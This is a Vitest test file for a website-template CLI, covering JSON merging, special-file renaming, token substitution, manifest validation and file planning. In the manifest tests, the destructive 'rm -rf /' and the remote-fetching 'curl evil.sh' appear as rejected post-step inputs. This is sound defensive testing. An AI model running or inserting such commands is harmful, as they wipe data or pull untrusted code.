import path from 'node:path';

import { describe, expect, it } from 'vitest';

import { deepMergeJson, stringifyJson } from '../src/generate/compose.js';
import {
  isMergeableJson,
  isTextFile,
  normaliseEol,
  renameSpecialFile,
  renameSpecialPath,
} from '../src/generate/files.js';
import { plan } from '../src/generate/plan.js';
import { buildTokenValues, findTokens, substituteTokens } from '../src/generate/tokens.js';
import { CliError } from '../src/errors.js';
import { parseManifest } from '../src/templates/manifest.js';
import { FAKE_MANIFEST, fakeRegistry, makeContext, memoryPlanFs } from './helpers.js';

const ROOT = path.join(path.parse(process.cwd()).root, 'fake-template');

function layerPath(...parts: string[]): string {
  return [ROOT, ...parts].join('/');
}

// ---------------------------------------------------------------------------
// Composition
// ---------------------------------------------------------------------------

describe('deepMergeJson', () => {
  it('merges nested objects key by key', () => {
    expect(
      deepMergeJson({ a: 1, nested: { x: 1, y: 2 } }, { b: 2, nested: { y: 9, z: 3 } }),
    ).toEqual({ a: 1, b: 2, nested: { x: 1, y: 9, z: 3 } });
  });

  it('lets the later layer replace scalars', () => {
    expect(deepMergeJson({ a: 1 }, { a: 2 })).toEqual({ a: 2 });
  });

  it('concatenates and de-duplicates arrays', () => {
    expect(deepMergeJson({ k: ['a', 'b'] }, { k: ['b', 'c'] })).toEqual({ k: ['a', 'b', 'c'] });
  });

  it('de-duplicates object array members structurally', () => {
    expect(deepMergeJson({ k: [{ a: 1 }] }, { k: [{ a: 1 }, { b: 2 }] })).toEqual({
      k: [{ a: 1 }, { b: 2 }],
    });
  });

  it('does not confuse the number 1 with the string "1"', () => {
    expect(deepMergeJson({ k: [1] }, { k: ['1'] })).toEqual({ k: [1, '1'] });
  });

  it('rejects a layer disagreement between array and object', () => {
    expect(() => deepMergeJson({ k: [] }, { k: {} })).toThrow(/disagree about the shape/);
  });

  it('serialises with a two-space indent and a trailing newline', () => {
    expect(stringifyJson({ a: 1 })).toBe('{\n  "a": 1\n}\n');
  });
});

// ---------------------------------------------------------------------------
// Special file naming
// ---------------------------------------------------------------------------

describe('underscore-prefixed template files', () => {
  it.each([
    ['_gitignore', '.gitignore'],
    ['_npmrc', '.npmrc'],
    ['_gitattributes', '.gitattributes'],
    ['_editorconfig', '.editorconfig'],
    ['_env.example', '.env.example'],
  ])('renames %s to %s', (input, expected) => {
    expect(renameSpecialFile(input)).toBe(expected);
  });

  it('renames _package.json to package.json, not .package.json', () => {
    expect(renameSpecialFile('_package.json')).toBe('package.json');
  });

  it('leaves ordinary names alone', () => {
    expect(renameSpecialFile('index.astro')).toBe('index.astro');
    expect(renameSpecialFile('_private.ts')).toBe('_private.ts');
  });

  it('only rewrites the final path segment', () => {
    expect(renameSpecialPath('src/_gitignore')).toBe('src/.gitignore');
    expect(renameSpecialPath('_gitignore/keep.txt')).toBe('_gitignore/keep.txt');
  });
});

describe('file classification', () => {
  it.each(['a.astro', 'a.ts', 'a.json', 'a.css', 'a.md', 'a.svg', '_gitignore', '_package.json'])(
    'treats %s as text',
    (file) => {
      expect(isTextFile(file)).toBe(true);
    },
  );

  it.each(['logo.png', 'photo.JPG', 'font.woff2', 'icon.ico', 'movie.mp4'])(
    'treats %s as binary',
    (file) => {
      expect(isTextFile(file)).toBe(false);
    },
  );

  it('deep-merges only package.json and tsconfig.json', () => {
    expect(isMergeableJson('package.json')).toBe(true);
    expect(isMergeableJson('tsconfig.json')).toBe(true);
    expect(isMergeableJson('data/other.json')).toBe(false);
  });

  it('normalises CRLF to LF', () => {
    expect(normaliseEol('a\r\nb\r\n')).toBe('a\nb\n');
  });
});

// ---------------------------------------------------------------------------
// Tokens
// ---------------------------------------------------------------------------

describe('token substitution', () => {
  const values = buildTokenValues(makeContext(), new Date('2026-01-01T00:00:00.000Z'));

  it('substitutes every supported token', () => {
    const source =
      '{{siteName}}|{{siteUrl}}|{{description}}|{{year}}|{{projectName}}|{{locale}}|{{mode}}';
    expect(substituteTokens(source, values, 'f')).toBe(
      'Acme Ltd|https://acme.example|Bespoke widgets.|2026|acme-website|en|coming-soon',
    );
  });

  it('tolerates inner whitespace', () => {
    expect(substituteTokens('{{ siteName }}', values, 'f')).toBe('Acme Ltd');
  });

  it('rejects an unknown token instead of emptying it', () => {
    expect(() => substituteTokens('{{nope}}', values, 'a.astro')).toThrow(
      /Unknown token \{\{nope\}\}/,
    );
    expect(() => substituteTokens('{{nope}}', values, 'a.astro')).toThrow(/a\.astro/);
  });

  it('reports several unknown tokens at once', () => {
    expect(() => substituteTokens('{{a}} {{b}}', values, 'f')).toThrow(/\{\{a\}\}, \{\{b\}\}/);
  });

  it('allows an absent siteUrl and author to be empty, and never invents one', () => {
    const absent = buildTokenValues(
      makeContext({
        site: {
          name: 'Acme',
          url: null,
          description: 'd',
          locale: 'en',
          author: null,
        },
      }),
      new Date('2026-01-01T00:00:00.000Z'),
    );
    expect(absent.siteUrl).toBe('');
    expect(absent.author).toBe('');
    expect(substituteTokens('url=[{{siteUrl}}]', absent, 'f')).toBe('url=[]');
  });

  it('refuses to emit an empty value for a non-nullable token', () => {
    const broken = { ...values, siteName: '' };
    expect(() => substituteTokens('{{siteName}}', broken, 'f')).toThrow(/empty value/);
  });

  it('finds the tokens a file references', () => {
    expect(findTokens('{{siteName}} and {{year}} and {{siteName}}')).toEqual(['siteName', 'year']);
  });
});

// ---------------------------------------------------------------------------
// Manifest
// ---------------------------------------------------------------------------

describe('parseManifest', () => {
  const valid = {
    id: 'fake-template',
    displayName: 'Fake',
    description: 'Fixture',
    version: '1.0.0',
    framework: 'astro',
    frameworkVersion: '7.3.2',
    minNode: '>=22.12.0',
    supportedModes: ['coming-soon', 'full'],
    defaults: { mode: 'coming-soon' },
    availableFeatures: [],
    tokens: ['siteName'],
    postSteps: ['install'],
    nextSteps: [],
  };

  it('accepts a well-formed manifest', () => {
    expect(parseManifest(valid, 't').id).toBe('fake-template');
  });

  it.each([
    ['missing key', { ...valid, version: undefined }, /missing required key "version"/],
    ['unknown key', { ...valid, extra: 1 }, /unknown key "extra"/],
    ['bad id', { ...valid, id: 'Fake_Template' }, /kebab-case/],
    ['unknown mode', { ...valid, supportedModes: ['landing'] }, /unsupported mode/],
    ['empty modes', { ...valid, supportedModes: [] }, /cannot be empty/],
    ['unknown token', { ...valid, tokens: ['nope'] }, /unknown token "nope"/],
    ['arbitrary post-step', { ...valid, postSteps: ['rm -rf /'] }, /unknown post-step/],
    ['features requested', { ...valid, availableFeatures: ['analytics'] }, /not supported in V1/],
    [
      'default outside supported',
      { ...valid, defaults: { mode: 'full' }, supportedModes: ['coming-soon'] },
      /not listed in "supportedModes"/,
    ],
    [
      'unknown defaults key',
      { ...valid, defaults: { nope: 1 } },
      /unknown key "nope" in "defaults"/,
    ],
    ['non-object', 'nope', /must be a JSON object/],
  ])('rejects %s', (_label, input, pattern) => {
    expect(() => parseManifest(input, 't')).toThrow(pattern);
  });

  it('names the allow-list when a template requests a shell command', () => {
    try {
      parseManifest({ ...valid, postSteps: ['curl evil.sh'] }, 't');
      expect.unreachable();
    } catch (error) {
      // The rejection is in the message; the remedy is in the hint.
      expect((error as CliError).message).toContain('unknown post-step "curl evil.sh"');
      expect((error as CliError).hint).toContain('Arbitrary commands are not supported');
      expect((error as CliError).hint).toContain('install, git-init, format');
    }
  });
});

// ---------------------------------------------------------------------------
// Planning
// ---------------------------------------------------------------------------

const TEMPLATE_FILES: Record<string, string> = {
  [layerPath('base', '_package.json')]: JSON.stringify({
    name: '{{projectName}}',
    keywords: ['astro', 'base'],
    scripts: { build: 'astro build' },
  }),
  [layerPath('base', '_gitignore')]: 'dist/\n',
  [layerPath('base', 'src', 'pages', 'index.astro')]: 'BASE PAGE\n',
  [layerPath('base', 'src', 'config', 'site.config.ts')]:
    "export const SITE = { name: '{{siteName}}', url: '{{siteUrl}}' };\n",
  [layerPath('base', 'public', 'logo.png')]: 'PNG-BYTES',
  [layerPath('modes', 'coming-soon', '_package.json')]: JSON.stringify({
    keywords: ['landing', 'astro'],
  }),
  [layerPath('modes', 'coming-soon', 'src', 'pages', 'index.astro')]: 'COMING SOON {{siteName}}\n',
};

/** makeContext() targets the real template id; planning fixtures use the fake. */
function fakeContext(overrides: Parameters<typeof makeContext>[0] = {}) {
  return makeContext({
    template: { id: FAKE_MANIFEST.id, version: FAKE_MANIFEST.version, mode: 'coming-soon' },
    ...overrides,
  });
}

function buildPlan(context = fakeContext()) {
  const fs = memoryPlanFs(TEMPLATE_FILES);
  const result = plan(context, { registry: fakeRegistry(FAKE_MANIFEST, ROOT), fs });
  return { plan: result, fs };
}

describe('plan', () => {
  it('includes base files', () => {
    const { plan: p } = buildPlan();
    expect(p.operations.map((op) => op.path)).toContain('.gitignore');
    expect(p.operations.map((op) => op.path)).toContain('src/config/site.config.ts');
  });

  it('lets the mode layer override a base file', () => {
    const { plan: p } = buildPlan();
    const page = p.operations.find((op) => op.path === 'src/pages/index.astro');
    expect(page?.type).toBe('write');
    expect(page && page.type === 'write' ? page.content : '').toBe('COMING SOON Acme Ltd\n');
  });

  it('deep-merges package.json across layers and de-duplicates keywords', () => {
    const { plan: p } = buildPlan();
    const pkg = p.operations.find((op) => op.path === 'package.json');
    const parsed = JSON.parse(pkg && pkg.type === 'write' ? pkg.content : '{}');
    expect(parsed.keywords).toEqual(['astro', 'base', 'landing']);
    expect(parsed.name).toBe('acme-website');
    expect(parsed.scripts.build).toBe('astro build');
  });

  it('renames underscore-prefixed files', () => {
    const { plan: p } = buildPlan();
    const paths = p.operations.map((op) => op.path);
    expect(paths).toContain('package.json');
    expect(paths).toContain('.gitignore');
    expect(paths).not.toContain('_package.json');
    expect(paths).not.toContain('_gitignore');
  });

  it('copies binary files without reading or substituting them', () => {
    const { plan: p, fs } = buildPlan();
    const logo = p.operations.find((op) => op.path === 'public/logo.png');
    expect(logo?.type).toBe('copy');
    expect(fs.reads.some((read) => read.endsWith('logo.png'))).toBe(false);
  });

  it('adds the provenance file', () => {
    const { plan: p } = buildPlan();
    const provenance = p.operations.find((op) => op.path === '.client-site.json');
    expect(provenance).toBeDefined();
    const parsed = JSON.parse(
      provenance && provenance.type === 'write' ? provenance.content : '{}',
    );
    expect(parsed.cliVersion).toBe('9.9.9');
    expect(parsed.template.id).toBe('fake-template');
    expect(parsed.template.version).toBe('1.2.3');
    expect(parsed.mode).toBe('coming-soon');
    expect(parsed.config.siteUrl).toBe('https://acme.example');
  });

  it('keeps a null siteUrl null in provenance', () => {
    const context = fakeContext({
      site: { name: 'Acme', url: null, description: 'd', locale: 'en', author: null },
    });
    const { plan: p } = buildPlan(context);
    const provenance = p.operations.find((op) => op.path === '.client-site.json');
    const parsed = JSON.parse(
      provenance && provenance.type === 'write' ? provenance.content : '{}',
    );
    expect(parsed.config.siteUrl).toBeNull();
  });

  it('is deterministic', () => {
    const a = buildPlan().plan;
    const b = buildPlan().plan;
    expect(JSON.stringify(a.operations)).toBe(JSON.stringify(b.operations));
  });

  it('returns operations sorted by path', () => {
    const paths = buildPlan().plan.operations.map((op) => op.path);
    expect(paths).toEqual([...paths].sort((x, y) => x.localeCompare(y)));
  });

  it('rejects a mode the template does not support', () => {
    const manifest = { ...FAKE_MANIFEST, supportedModes: ['coming-soon'] as const };
    expect(() =>
      plan(fakeContext({ template: { id: FAKE_MANIFEST.id, version: '1.2.3', mode: 'full' } }), {
        registry: fakeRegistry(manifest, ROOT),
        fs: memoryPlanFs(TEMPLATE_FILES),
      }),
    ).toThrow(/does not support mode "full"/);
  });

  it('emits LF content only', () => {
    const fs = memoryPlanFs({ ...TEMPLATE_FILES, [layerPath('base', 'a.md')]: 'x\r\ny\r\n' });
    const p = plan(fakeContext(), { registry: fakeRegistry(FAKE_MANIFEST, ROOT), fs });
    for (const operation of p.operations) {
      if (operation.type === 'write') expect(operation.content).not.toContain('\r\n');
    }
  });
});
